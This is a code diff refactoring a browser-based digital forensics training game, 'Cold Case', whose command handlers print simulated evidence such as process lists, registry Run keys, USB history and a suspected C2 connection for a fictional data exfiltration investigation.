@@ -2,1601 +2,587 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <script src="../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('sorted');</script>
+    <script src="../../../components/AchievementManager.js"></script>
+    <script src="../../../components/ModuleProgress.js"></script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FORENSICS-01: Cold Case | Operator</title>
-    <style>
-        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-        body {
-            background: #0a0c10;
-            color: rgba(255,255,255,0.85);
-            font-family: 'Courier New', monospace;
-            overflow: hidden;
-            height: 100vh;
-            width: 100vw;
-        }
-
-        /* CRT scanlines */
-        body::after {
-            content: '';
-            position: fixed;
-            inset: 0;
-            background: repeating-linear-gradient(
-                0deg,
-                rgba(0,0,0,0.1) 0px,
-                rgba(0,0,0,0.1) 1px,
-                transparent 1px,
-                transparent 3px
-            );
-            pointer-events: none;
-            z-index: 9000;
-        }
-
-        /* ─── Header ─── */
-        .mission-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 10px 20px;
-            background: #0e1018;
-            border-bottom: 1px solid rgba(57, 255, 20, 0.15);
-            height: 44px;
-            flex-shrink: 0;
-        }
-        .mission-header-back {
-            font-size: 0.75rem;
-            color: rgba(255,255,255,0.4);
-            text-decoration: none;
-            letter-spacing: 0.08em;
-            transition: color 0.2s;
-        }
-        .mission-header-back:hover { color: #39ff14; }
-        .mission-header-title {
-            font-size: 0.7rem;
-            letter-spacing: 0.15em;
-            color: #39ff14;
-            text-transform: uppercase;
-            font-weight: 600;
-        }
-        .mission-header-status {
-            font-size: 0.6rem;
-            letter-spacing: 0.12em;
-            color: rgba(57, 255, 20, 0.4);
-            text-transform: uppercase;
-        }
-
-        /* ─── Objectives Bar ─── */
-        .obj-bar {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            padding: 7px 20px;
-            background: #0c0e14;
-            border-bottom: 1px solid rgba(57, 255, 20, 0.1);
-            overflow-x: auto;
-            flex-shrink: 0;
-        }
-        .obj-label {
-            font-size: 0.55rem;
-            letter-spacing: 0.15em;
-            color: rgba(57, 255, 20, 0.3);
-            text-transform: uppercase;
-            white-space: nowrap;
-            margin-right: 4px;
-        }
-        .obj-item {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            font-size: 0.6rem;
-            color: rgba(255, 255, 255, 0.25);
-            letter-spacing: 0.04em;
-            white-space: nowrap;
-            transition: color 0.3s;
-        }
-        .obj-item.complete { color: #39ff14; }
-        .obj-check {
-            width: 13px;
-            height: 13px;
-            border-radius: 3px;
-            border: 1px solid rgba(57, 255, 20, 0.15);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 0.55rem;
-            flex-shrink: 0;
-            transition: all 0.3s;
-        }
-        .obj-item.complete .obj-check {
-            background: rgba(57, 255, 20, 0.15);
-            border-color: #39ff14;
-            color: #39ff14;
-        }
-
-        /* ─── Split Layout ─── */
-        .mission-layout {
-            display: flex;
-            height: calc(100vh - 44px - 30px);
-        }
-
-        /* ─── Map Panel (left 55%) ─── */
-        .map-panel {
-            flex: 0 0 55%;
-            position: relative;
-            overflow: hidden;
-            border-right: 1px solid rgba(57, 255, 20, 0.1);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #090b0f;
-        }
-        .map-panel::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background-image:
-                linear-gradient(rgba(57, 255, 20, 0.015) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(57, 255, 20, 0.015) 1px, transparent 1px);
-            background-size: 30px 30px;
-            pointer-events: none;
-        }
-
-        /* ─── Grid ─── */
-        .grid-container {
-            display: grid;
-            grid-template-columns: repeat(5, 1fr);
-            grid-template-rows: repeat(4, 1fr);
-            gap: 4px;
-            padding: 20px;
-            width: 100%;
-            height: 100%;
-            max-width: 600px;
-            max-height: 480px;
-        }
-
-        .grid-cell {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            border: 1px solid rgba(57, 255, 20, 0.06);
-            border-radius: 4px;
-            position: relative;
-            transition: all 0.4s ease;
-            min-height: 0;
-            overflow: hidden;
-        }
-
-        /* Cell visibility states */
-        .grid-cell.vis-hidden {
-            background: rgba(57, 255, 20, 0.01);
-            border-color: rgba(57, 255, 20, 0.04);
-        }
-        .grid-cell.vis-revealed {
-            background: rgba(57, 255, 20, 0.05);
-            border-color: rgba(57, 255, 20, 0.15);
-        }
-        .grid-cell.vis-visited {
-            background: rgba(57, 255, 20, 0.09);
-            border-color: rgba(57, 255, 20, 0.25);
-        }
-        .grid-cell.current {
-            background: rgba(57, 255, 20, 0.14);
-            border-color: #39ff14;
-            box-shadow: 0 0 12px rgba(57, 255, 20, 0.15), inset 0 0 8px rgba(57, 255, 20, 0.05);
-        }
-        .grid-cell.wall {
-            background: rgba(255, 255, 255, 0.015);
-            border-color: rgba(255, 255, 255, 0.03);
-        }
-        .grid-cell.empty-vis {
-            background: rgba(57, 255, 20, 0.03);
-        }
-
-        /* Evidence accent — amber/gold left border for examined nodes */
-        .grid-cell[data-examined="true"]:not(.vis-hidden):not(.wall) {
-            border-left: 2px solid rgba(255, 180, 0, 0.5);
-        }
-        .grid-cell[data-examined="true"].current {
-            border-left: 2px solid rgba(255, 180, 0, 0.8);
-        }
-
-        /* Cell content */
-        .cell-icon {
-            font-size: 0.85rem;
-            font-weight: 700;
-            letter-spacing: 0.08em;
-            transition: color 0.3s;
-        }
-        .cell-label {
-            font-size: 0.5rem;
-            letter-spacing: 0.06em;
-            margin-top: 2px;
-            transition: color 0.3s;
-            text-align: center;
-        }
-        .vis-hidden .cell-icon { color: rgba(255, 255, 255, 0.06); }
-        .vis-hidden .cell-label { color: transparent; }
-        .vis-revealed .cell-icon { color: rgba(57, 255, 20, 0.45); }
-        .vis-revealed .cell-label { color: rgba(57, 255, 20, 0.2); }
-        .vis-visited .cell-icon { color: rgba(57, 255, 20, 0.7); }
-        .vis-visited .cell-label { color: rgba(57, 255, 20, 0.35); }
-        .current .cell-icon { color: #39ff14; }
-        .current .cell-label { color: rgba(57, 255, 20, 0.6); }
-        .wall .cell-icon { color: rgba(255, 255, 255, 0.04); }
-        .wall .cell-label { color: transparent; }
-
-        /* Agent dot */
-        .cell-agent {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: #39ff14;
-            position: absolute;
-            bottom: 5px;
-            right: 5px;
-            animation: agentPulse 2s ease-in-out infinite;
-            box-shadow: 0 0 6px rgba(57, 255, 20, 0.5);
-        }
-        @keyframes agentPulse {
-            0%, 100% { box-shadow: 0 0 4px rgba(57, 255, 20, 0.3); transform: scale(1); }
-            50% { box-shadow: 0 0 12px rgba(57, 255, 20, 0.7), 0 0 20px rgba(57, 255, 20, 0.15); transform: scale(1.15); }
-        }
-
-        /* Cell reveal animation */
-        @keyframes cellReveal {
-            from { opacity: 0; transform: scale(0.9); }
-            to { opacity: 1; transform: scale(1); }
-        }
-        .grid-cell.just-revealed {
-            animation: cellReveal 0.4s ease-out;
-        }
-
-        /* ─── Terminal Panel (right 45%) ─── */
-        .term-panel {
-            flex: 0 0 45%;
-            display: flex;
-            flex-direction: column;
-            height: 100%;
-            background: #080a0e;
-        }
-        .term-bar {
-            padding: 7px 14px;
-            background: #0c0e14;
-            border-bottom: 1px solid rgba(57, 255, 20, 0.1);
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            flex-shrink: 0;
-        }
-        .term-dot {
-            width: 7px;
-            height: 7px;
-            border-radius: 50%;
-            background: rgba(57, 255, 20, 0.3);
-        }
-        .term-bar-label {
-            font-size: 0.55rem;
-            color: rgba(57, 255, 20, 0.35);
-            letter-spacing: 0.1em;
-            margin-left: 6px;
-        }
-        .term-output {
-            flex: 1;
-            overflow-y: auto;
-            padding: 10px 14px;
-            font-size: 0.78rem;
-            line-height: 1.65;
-        }
-        .term-output::-webkit-scrollbar { width: 4px; }
-        .term-output::-webkit-scrollbar-track { background: transparent; }
-        .term-output::-webkit-scrollbar-thumb { background: rgba(57, 255, 20, 0.15); border-radius: 2px; }
-
-        /* Terminal line types */
-        .term-line { word-break: break-word; }
-        .term-system { color: rgba(57, 255, 20, 0.3); }
-        .term-info { color: rgba(57, 255, 20, 0.65); }
-        .term-success { color: #39ff14; font-weight: 600; }
-        .term-error { color: #ff4444; }
-        .term-warning { color: #ffaa00; }
-        .term-node-info { color: #00ccff; }
-        .term-heading { color: #39ff14; font-weight: 700; }
-        .term-prompt-echo { color: rgba(57, 255, 20, 0.45); }
-        /* Evidence accent for terminal output */
-        .term-evidence { color: #ffb400; }
-
-        /* Terminal input */
-        .term-input-row {
-            display: flex;
-            align-items: center;
-            padding: 8px 14px;
-            border-top: 1px solid rgba(57, 255, 20, 0.1);
-            background: #0a0c12;
-            flex-shrink: 0;
-        }
-        .term-prompt-text {
-            color: #39ff14;
-            font-size: 0.78rem;
-            white-space: nowrap;
-            margin-right: 8px;
-        }
-        .term-input {
-            flex: 1;
-            background: transparent;
-            border: none;
-            outline: none;
-            color: #76ff03;
-            font-family: 'Courier New', monospace;
-            font-size: 0.78rem;
-            caret-color: #39ff14;
-        }
-
-        /* ─── Mission Complete Overlay ─── */
-        .mission-complete {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.88);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 8000;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.6s;
-        }
-        .mission-complete.visible {
-            opacity: 1;
-            pointer-events: auto;
-        }
-        .mc-card {
-            background: #0e1018;
-            border: 1px solid rgba(57, 255, 20, 0.3);
-            border-radius: 8px;
-            padding: 36px 40px;
-            text-align: center;
-            max-width: 380px;
-            width: 90%;
-        }
-        .mc-badge {
-            font-size: 0.55rem;
-            letter-spacing: 0.2em;
-            color: rgba(57, 255, 20, 0.5);
-            text-transform: uppercase;
-            margin-bottom: 10px;
-        }
-        .mc-title {
-            font-size: 1.3rem;
-            color: #39ff14;
-            letter-spacing: 0.2em;
-            margin-bottom: 6px;
-            text-shadow: 0 0 20px rgba(57, 255, 20, 0.3);
-        }
-        .mc-subtitle {
-            font-size: 0.7rem;
-            color: rgba(255,255,255,0.35);
-            margin-bottom: 28px;
-        }
-        .mc-stats {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-            margin-bottom: 28px;
-        }
-        .mc-stat-value {
-            font-size: 1.5rem;
-            color: #39ff14;
-            font-weight: 700;
-        }
-        .mc-stat-label {
-            font-size: 0.55rem;
-            color: rgba(255,255,255,0.25);
-            letter-spacing: 0.08em;
-            margin-top: 3px;
-            text-transform: uppercase;
-        }
-        .mc-btn {
-            display: inline-block;
-            padding: 10px 28px;
-            background: rgba(57, 255, 20, 0.1);
-            border: 1px solid rgba(57, 255, 20, 0.3);
-            border-radius: 4px;
-            color: #39ff14;
-            font-family: 'Courier New', monospace;
-            font-size: 0.7rem;
-            letter-spacing: 0.12em;
-            text-decoration: none;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .mc-btn:hover {
-            background: rgba(57, 255, 20, 0.2);
-            border-color: #39ff14;
-            box-shadow: 0 0 15px rgba(57, 255, 20, 0.15);
-        }
-
-        /* ─── Mobile ─── */
-        @media (max-width: 768px) {
-            .mission-layout {
-                flex-direction: column;
-            }
-            .map-panel {
-                flex: 0 0 42%;
-                border-right: none;
-                border-bottom: 1px solid rgba(57, 255, 20, 0.1);
-            }
-            .term-panel {
-                flex: 1;
-            }
-            .obj-bar { gap: 10px; padding: 6px 12px; }
-            .obj-item { font-size: 0.5rem; }
-            .obj-label { font-size: 0.5rem; }
-            .grid-container { padding: 10px; max-height: none; }
-        }
-        @media (max-width: 480px) {
-            .mission-header { padding: 8px 12px; height: 38px; }
-            .mission-header-title { font-size: 0.6rem; }
-            .mission-layout { height: calc(100vh - 38px - 26px); }
-            .cell-label { display: none; }
-            .cell-icon { font-size: 0.7rem; }
-            .cell-agent { width: 8px; height: 8px; bottom: 3px; right: 3px; }
-            .mc-card { padding: 24px; }
-        }
-    </style>
+    <link rel="stylesheet" href="../engine/operator.css">
 </head>
 <body>
+    <div id="operator-root"></div>
 
-    <!-- Header -->
-    <div class="mission-header">
-        <a href="../index.html" class="mission-header-back">&larr; OPERATOR</a>
-        <div class="mission-header-title">FORENSICS-01 / COLD CASE</div>
-        <div class="mission-header-status" id="header-status">IN PROGRESS</div>
-    </div>
+    <script src="../engine/OperatorEngine.js"></script>
+    <script src="../engine/AgentBridge.js"></script>
+    <script src="../configs/forensics-01.config.js"></script>
+    <script>
+    (function() {
+        var engine = OperatorEngine.init(FORENSICS_01_CONFIG);
+        var agent  = AgentBridge.create(engine);
+        var config = FORENSICS_01_CONFIG;
 
-    <!-- Objectives bar -->
-    <div class="obj-bar">
-        <span class="obj-label">OBJ</span>
-        <div class="obj-item" id="obj-0">
-            <span class="obj-check"></span> Image the disk
-        </div>
-        <div class="obj-item" id="obj-1">
-            <span class="obj-check"></span> Find malware dropper
-        </div>
-        <div class="obj-item" id="obj-2">
-            <span class="obj-check"></span> Recover deleted evidence
-        </div>
-        <div class="obj-item" id="obj-3">
-            <span class="obj-check"></span> Build forensic timeline
-        </div>
-    </div>
+        // ---- Forensics-specific state (extends engine state) ----
+        // nodesExamined is tracked on engine state as a Set
 
-    <!-- Split layout -->
-    <div class="mission-layout">
-        <!-- Left: Evidence Map -->
-        <div class="map-panel">
-            <div class="grid-container" id="grid-container"></div>
-        </div>
+        // ---- Helpers ----
 
-        <!-- Right: Terminal -->
-        <div class="term-panel" id="term-panel">
-            <div class="term-bar">
-                <div class="term-dot"></div>
-                <div class="term-dot"></div>
-                <div class="term-dot"></div>
-                <span class="term-bar-label">FORENSIC TERMINAL</span>
-            </div>
-            <div class="term-output" id="term-output"></div>
-            <div class="term-input-row">
-                <span class="term-prompt-text">examiner@forensics:~$</span>
-                <input type="text" class="term-input" id="term-input" autocomplete="off" spellcheck="false" autofocus>
-            </div>
-        </div>
-    </div>
-
-    <!-- Mission Complete Overlay -->
-    <div class="mission-complete" id="mission-complete">
-        <div class="mc-card">
-            <div class="mc-badge">MISSION COMPLETE</div>
-            <div class="mc-title">COLD CASE</div>
-            <div class="mc-subtitle">Evidence secured. Case closed.</div>
-            <div class="mc-stats">
-                <div>
-                    <div class="mc-stat-value" id="stat-sources">0</div>
-                    <div class="mc-stat-label">Sources</div>
-                </div>
-                <div>
-                    <div class="mc-stat-value" id="stat-commands">0</div>
-                    <div class="mc-stat-label">Commands</div>
-                </div>
-                <div>
-                    <div class="mc-stat-value" id="stat-time">0s</div>
-                    <div class="mc-stat-label">Time</div>
-                </div>
-            </div>
-            <a href="../index.html" class="mc-btn">RETURN TO OPERATOR</a>
-        </div>
-    </div>
-
-<script>
-/* ═══════════════════════════════════════════════════════════
-   FORENSICS-01: Cold Case — Mission Engine
-   ═══════════════════════════════════════════════════════════ */
-
-// ─── Grid Map ───
-// Rows 0-3, Cols 0-4
-// 'wall' cells are impassable and invisible; 'empty' cells are traversable open space
-const GRID_MAP = [
-    ['evidence-ws', 'empty',       'disk-image',  'memory-dump', 'wall'],
-    ['empty',       'registry',    'empty',        'browser-data','email-store'],
-    ['wall',        'event-logs',  'empty',        'empty',       'wall'],
-    ['wall',        'wall',        'recycle-bin',  'wall',        'wall']
-];
-
-const ROWS = 4;
-const COLS = 5;
-
-// ─── Cell Info ───
-// Each node represents a forensic evidence source on the suspect machine
-const CELL_INFO = {
-    'evidence-ws':  { label: 'EVIDENCE-WS',  abbr: 'EWS', ip: 'localhost', desc: 'Forensic examination workstation',           os: 'SIFT Workstation 22.04' },
-    'disk-image':   { label: 'DISK-IMAGE',   abbr: 'DSK', ip: '\u2014',    desc: 'Raw disk image (suspect-hdd.dd)',             os: 'NTFS / 500GB' },
-    'memory-dump':  { label: 'MEM-DUMP',     abbr: 'MEM', ip: '\u2014',    desc: 'Volatile memory capture (8GB RAM dump)',      os: 'Volatility 3' },
-    'registry':     { label: 'REGISTRY',     abbr: 'REG', ip: '\u2014',    desc: 'Windows registry hive exports',               os: 'Windows 11' },
-    'browser-data': { label: 'BROWSER',      abbr: 'BRW', ip: '\u2014',    desc: 'Chrome browser history and cache',            os: 'Chrome 120' },
-    'email-store':  { label: 'EMAIL',        abbr: 'EML', ip: '\u2014',    desc: 'Outlook PST archive',                         os: 'Outlook 2021' },
-    'event-logs':   { label: 'EVENT-LOGS',   abbr: 'EVT', ip: '\u2014',    desc: 'Windows Event Log exports (evtx)',            os: 'Windows 11' },
-    'recycle-bin':  { label: 'RECYCLE-BIN',  abbr: 'RCB', ip: '\u2014',    desc: 'Recovered deleted files from $Recycle.Bin',   os: 'NTFS' }
-};
-
-// ─── Game State ───
-// All mission-critical flags are tracked here; Sets are serialized as arrays for localStorage
-let STATE = {
-    position: { col: 0, row: 0 },
-    visibility: {},
-    objectives: [false, false, false, false],
-    nodesDiscovered: new Set(),
-    nodesExamined: new Set(),
-    diskImaged: false,
-    dropperFound: false,
-    evidenceRecovered: false,
-    timelineBuilt: false,
-    commandCount: 0,
-    commandHistory: [],
-    historyIndex: -1,
-    startTime: Date.now(),
-    completed: false
-};
-
-// ─── Objective announcement labels ───
-const OBJ_LABELS = [
-    'DISK IMAGED \u2014 integrity verified',
-    'MALWARE DROPPER FOUND \u2014 C2 beacon confirmed',
-    'DELETED EVIDENCE RECOVERED \u2014 files restored to locker',
-    'FORENSIC TIMELINE BUILT \u2014 attack sequence reconstructed'
-];
-
-// ═══ Grid Rendering ═══
-
-function buildGrid() {
-    var container = document.getElementById('grid-container');
-    container.innerHTML = '';
-    for (var r = 0; r < ROWS; r++) {
-        for (var c = 0; c < COLS; c++) {
-            var cell = document.createElement('div');
-            cell.className = 'grid-cell';
-            cell.dataset.col = c;
-            cell.dataset.row = r;
-            cell.dataset.type = GRID_MAP[r][c];
-            cell.dataset.examined = 'false';
-
-            var icon = document.createElement('div');
-            icon.className = 'cell-icon';
-
-            var label = document.createElement('div');
-            label.className = 'cell-label';
-
-            var agent = document.createElement('div');
-            agent.className = 'cell-agent';
-            agent.style.display = 'none';
-
-            cell.appendChild(icon);
-            cell.appendChild(label);
-            cell.appendChild(agent);
-            container.appendChild(cell);
+        function getCell() {
+            var state = engine.getState();
+            return config.grid.cells[state.position.row][state.position.col];
         }
-    }
-}
 
-function updateGrid() {
-    for (var r = 0; r < ROWS; r++) {
-        for (var c = 0; c < COLS; c++) {
-            var cell = document.querySelector('.grid-cell[data-col="' + c + '"][data-row="' + r + '"]');
-            if (!cell) continue;
+        // Hash map for known artifacts
+        var hashMap = {
+            'suspect-hdd.dd':           'a3f2c8d91e4b76a05f2381cd9047e3f6a8b1c4d7e9025abc13ef7d2900cc4182',
+            'mem_20240115.dmp':          'b7e1f43a908d25c6e0471b3d85a2f9c04e6d18b7f2a3c8d9e0f14b2596c3a78d',
+            'secure-transfer-tool.exe':  'f4d2e1b39a7c056f8d3a2e9b14c708d6f1e2a3b4c5d6e7f8091a2b3c4d5e6f7a',
+            'quarterly-financials.xlsx': '2a9b4c8d1e3f5607a89b0c2d4e6f810a2b4c6d8e0f2a4b6c8d0e2f4a6b8c0d2e'
+        };
 
-            var type = GRID_MAP[r][c];
-            var key = c + ',' + r;
-            var vis = STATE.visibility[key] || 'hidden';
-            var isCurrent = STATE.position.col === c && STATE.position.row === r;
+        // ---- Command handlers ----
 
-            // Reset classes, preserve data attributes
-            cell.className = 'grid-cell';
-            cell.dataset.col = c;
-            cell.dataset.row = r;
-            cell.dataset.type = type;
+        function cmdHelp() {
+            engine.printLine('', 'system');
+            engine.printLine('\u2550\u2550\u2550 COMMAND REFERENCE \u2550\u2550\u2550', 'heading');
+            engine.printLine('  scan                     Survey area, reveal adjacent sources', 'info');
+            engine.printLine('  move <dir>               Move examiner (north/south/east/west or n/s/e/w)', 'info');
+            engine.printLine('  examine                  Examine current node for evidence', 'info');
+            engine.printLine('  strings <artifact>       Run strings analysis on an artifact', 'info');
+            engine.printLine('  timeline                 Build forensic timeline (requires 3+ sources examined)', 'info');
+            engine.printLine('  recover <file>           Recover deleted files (at RECYCLE-BIN only)', 'info');
+            engine.printLine('  hash <file>              Compute SHA-256 hash of an artifact', 'info');
+            engine.printLine('  report                   Generate summary of findings so far', 'info');
+            engine.printLine('  status                   Show position and objectives', 'info');
+            engine.printLine('  help                     Show this reference', 'info');
+            engine.printLine('  clear                    Clear terminal output', 'info');
+            engine.printLine('', 'system');
+            engine.printLine('Hint: "examine" every node you visit. Use "strings" on downloads.', 'system');
+        }
 
-            // Mark examined nodes for amber accent
-            var nodeKey = type;
-            cell.dataset.examined = (STATE.nodesExamined.has(nodeKey)) ? 'true' : 'false';
-
-            if (type === 'wall') {
-                cell.classList.add('wall');
-            } else if (isCurrent) {
-                cell.classList.add('current');
+        function cmdScan() {
+            var state = engine.getState();
+            var col = state.position.col, row = state.position.row;
+            var cellType = config.grid.cells[row][col];
+            engine.printLine('Scanning area...', 'system');
+            engine.printLine('', 'system');
+            if (cellType !== 'empty' && cellType !== 'wall') {
+                var cur = config.nodes[cellType];
+                engine.printLine('Current: ' + cur.label + ' \u2014 ' + cur.desc, 'heading');
+                engine.printLine('OS/Type: ' + cur.os, 'info');
             } else {
-                cell.classList.add('vis-' + vis);
-                if (type === 'empty' && vis !== 'hidden') cell.classList.add('empty-vis');
+                engine.printLine('Current: Clear area (no evidence source here)', 'heading');
             }
+            engine.printLine('', 'system');
+            engine.printLine('Adjacent:', 'heading');
+            var dirs = [{ name: 'North', dc: 0, dr: -1 }, { name: 'South', dc: 0, dr: 1 }, { name: 'East', dc: 1, dr: 0 }, { name: 'West', dc: -1, dr: 0 }];
+            dirs.forEach(function(d) {
+                var nc = col + d.dc, nr = row + d.dr;
+                if (nc < 0 || nc >= config.grid.cols || nr < 0 || nr >= config.grid.rows) { engine.printLine('  ' + d.name + ': [boundary]', 'system'); return; }
+                var type = config.grid.cells[nr][nc];
+                if (type === 'wall') { engine.printLine('  ' + d.name + ': [inaccessible]', 'system'); return; }
+                var key = nc + ',' + nr;
+                if (!state.visibility[key] || state.visibility[key] === 'hidden') state.visibility[key] = 'revealed';
+                if (type === 'empty') { engine.printLine('  ' + d.name + ': Clear path', 'info'); }
+                else { var info = config.nodes[type]; engine.printLine('  ' + d.name + ': ' + info.label + ' \u2014 ' + info.desc, 'node-info'); }
+            });
+            engine.updateGrid();
+            engine.saveState();
+        }
 
-            // Cell content
-            var iconEl = cell.querySelector('.cell-icon');
-            var labelEl = cell.querySelector('.cell-label');
-            var agentEl = cell.querySelector('.cell-agent');
-
-            if (type === 'wall') {
-                iconEl.textContent = '';
-                labelEl.textContent = '';
-            } else if (vis === 'hidden' && !isCurrent) {
-                iconEl.textContent = '?';
-                labelEl.textContent = '';
-            } else if (type === 'empty') {
-                iconEl.textContent = '\u00B7';
-                labelEl.textContent = '';
+        function cmdMove(args) {
+            if (!args.length) { engine.printLine('Usage: move <direction>', 'error'); engine.printLine('Directions: north/south/east/west (or n/s/e/w)', 'system'); return; }
+            var dirMap = { 'north': [0,-1], 'n': [0,-1], 'south': [0,1], 's': [0,1], 'east': [1,0], 'e': [1,0], 'west': [-1,0], 'w': [-1,0] };
+            var dir = args[0].toLowerCase();
+            if (!dirMap[dir]) { engine.printLine('Unknown direction: ' + args[0], 'error'); engine.printLine('Use: north/south/east/west (or n/s/e/w)', 'system'); return; }
+            var state = engine.getState();
+            var d = dirMap[dir];
+            var newCol = state.position.col + d[0], newRow = state.position.row + d[1];
+            if (newCol < 0 || newCol >= config.grid.cols || newRow < 0 || newRow >= config.grid.rows) { engine.printLine('Cannot move ' + dir + '. Edge of workspace.', 'error'); return; }
+            var cellType = config.grid.cells[newRow][newCol];
+            if (cellType === 'wall') { engine.printLine('Blocked. No path ' + dir + '.', 'error'); return; }
+            state.position = { col: newCol, row: newRow };
+            state.visibility[newCol + ',' + newRow] = 'visited';
+            if (cellType !== 'empty') state.nodesDiscovered.add(cellType);
+            engine.revealAdjacent(newCol, newRow);
+            var dirFull = { n: 'north', s: 'south', e: 'east', w: 'west' };
+            var dirName = dirFull[dir] || dir;
+            if (cellType === 'empty') {
+                engine.printLine('Moving ' + dirName + '... Clear area.', 'system');
             } else {
-                var info = CELL_INFO[type];
-                iconEl.textContent = info.abbr;
-                labelEl.textContent = (vis === 'visited' || isCurrent) ? info.label : '';
+                var info = config.nodes[cellType];
+                engine.printLine('Moving ' + dirName + '... Reached ' + info.label, 'success');
+                engine.printLine(info.desc + ' [' + info.os + ']', 'info');
+                engine.printLine('Use "examine" to analyze this source.', 'system');
+            }
+            engine.checkObjectives();
+            engine.updateGrid();
+            engine.saveState();
+        }
+
+        function cmdExamine() {
+            var state = engine.getState();
+            var cellType = getCell();
+            if (cellType === 'empty' || cellType === 'wall') { engine.printLine('Nothing to examine here. Move to an evidence source.', 'warning'); return; }
+
+            // Initialize nodesExamined Set if needed
+            if (!state.nodesExamined) state.nodesExamined = new Set();
+            state.nodesExamined.add(cellType);
+
+            engine.printLine('', 'system');
+            engine.printLine('\u2550\u2550\u2550 EXAMINING: ' + config.nodes[cellType].label + ' \u2550\u2550\u2550', 'heading');
+            engine.printLine('', 'system');
+
+            switch (cellType) {
+                case 'evidence-ws':
+                    engine.printLine('Case #2024-0847 \u2014 OPEN', 'evidence');
+                    engine.printLine('Subject: John Doe (jdoe), Senior Financial Analyst', 'info');
+                    engine.printLine('Allegation: Suspected data exfiltration from corporate laptop', 'info');
+                    engine.printLine('Device: Dell Latitude 7420, SN: DL7420-2847', 'info');
+                    engine.printLine('', 'system');
+                    engine.printLine('Collected artifacts:', 'heading');
+                    engine.printLine('  [1] suspect-hdd.dd     \u2014 raw disk image, 500GB', 'node-info');
+                    engine.printLine('  [2] mem_20240115.dmp    \u2014 volatile memory, 8GB', 'node-info');
+                    engine.printLine('  [3] registry_hives.zip  \u2014 SYSTEM, SOFTWARE, NTUSER.DAT', 'node-info');
+                    engine.printLine('  [4] chrome_profile.zip  \u2014 browser history, cache, downloads', 'node-info');
+                    engine.printLine('  [5] outlook.pst         \u2014 mail archive, 2.4GB', 'node-info');
+                    engine.printLine('  [6] evtx_export.zip     \u2014 Security/System/Application logs', 'node-info');
+                    engine.printLine('', 'system');
+                    engine.printLine('Begin analysis. Image the disk first.', 'system');
+                    break;
+
+                case 'disk-image':
+                    engine.printLine('Mounting suspect-hdd.dd for analysis...', 'system');
+                    engine.printLine('', 'system');
+                    engine.printLine('Computing integrity hash...', 'system');
+                    engine.printLine('SHA-256: a3f2c8d91e4b76a05f2381cd9047e3f6a8b1c4d7e9025abc13...', 'evidence');
+                    engine.printLine('        (integrity confirmed \u2014 hash matches intake record)', 'success');
+                    engine.printLine('', 'system');
+                    engine.printLine('Partition table:', 'heading');
+                    engine.printLine('  /dev/sda1   NTFS primary   465.8 GB  [Windows C: drive]', 'node-info');
+                    engine.printLine('  /dev/sda2   NTFS recovery  499.0 MB  [WinRE Recovery]', 'node-info');
+                    engine.printLine('', 'system');
+                    engine.printLine('File system stats:', 'heading');
+                    engine.printLine('  Total files:   148,392', 'info');
+                    engine.printLine('  Deleted files: 847 (recoverable)', 'info');
+                    engine.printLine('  Last write:    2024-01-15 14:27:03 UTC', 'info');
+                    engine.printLine('', 'system');
+                    engine.printLine('Disk image verified and mounted.', 'success');
+                    state.diskImaged = true;
+                    break;
+
+                case 'memory-dump':
+                    engine.printLine('Analyzing mem_20240115.dmp with Volatility 3...', 'system');
+                    engine.printLine('Profile: Windows 11 x64 (Build 22621)', 'info');
+                    engine.printLine('', 'system');
+                    engine.printLine('Running process list (pslist):', 'heading');
+                    engine.printLine('  PID   PPID  Name                    Start Time', 'node-info');
+                    engine.printLine('  4     0     System', 'node-info');
+                    engine.printLine('  688   4     smss.exe', 'node-info');
+                    engine.printLine('  892   884   winlogon.exe', 'node-info');
+                    engine.printLine('  1024  892   explorer.exe            14:01:12', 'node-info');
+                    engine.printLine('  2140  1024  chrome.exe              13:50:44', 'node-info');
+                    engine.printLine('  2248  1024  outlook.exe             09:12:03', 'node-info');
+                    engine.printLine('  2891  1024  cmd.exe                 14:02:18', 'node-info');
+                    engine.printLine('  3012  2891  powershell.exe          14:02:19', 'warning');
+                    engine.printLine('         [!] Encoded command detected (-enc flag)', 'warning');
+                    engine.printLine('  3201  3012  update-service.exe      14:02:31', 'warning');
+                    engine.printLine('         [!] NOT in OS baseline \u2014 UNKNOWN BINARY', 'warning');
+                    engine.printLine('  720   4     svchost.exe x8          (system)', 'node-info');
+                    engine.printLine('', 'system');
+                    engine.printLine('Network connections (netscan):', 'heading');
+                    engine.printLine('  update-service.exe -> 185.220.101.47:443 (ESTABLISHED)', 'warning');
+                    engine.printLine('  [!] Outbound C2 beacon suspected', 'warning');
+                    break;
+
+                case 'registry':
+                    engine.printLine('Parsing registry hive exports...', 'system');
+                    engine.printLine('', 'system');
+                    engine.printLine('USB device history (USBSTOR):', 'heading');
+                    engine.printLine('  SANDISK_CRUZER_128GB', 'evidence');
+                    engine.printLine('    Serial:     4C530012891231000001', 'node-info');
+                    engine.printLine('    First seen: 2024-01-15 14:05:22 UTC', 'node-info');
+                    engine.printLine('    Last seen:  2024-01-15 14:21:14 UTC', 'node-info');
+                    engine.printLine('    Drive letter assigned: D:', 'node-info');
+                    engine.printLine('', 'system');
+                    engine.printLine('Run keys (persistence / autostart):', 'heading');
+                    engine.printLine('  HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'node-info');
+                    engine.printLine('    UpdateService = C:\\Users\\jdoe\\AppData\\Roaming\\update-service.exe', 'warning');
+                    engine.printLine('    [!] SUSPICIOUS \u2014 not a legitimate Windows service', 'warning');
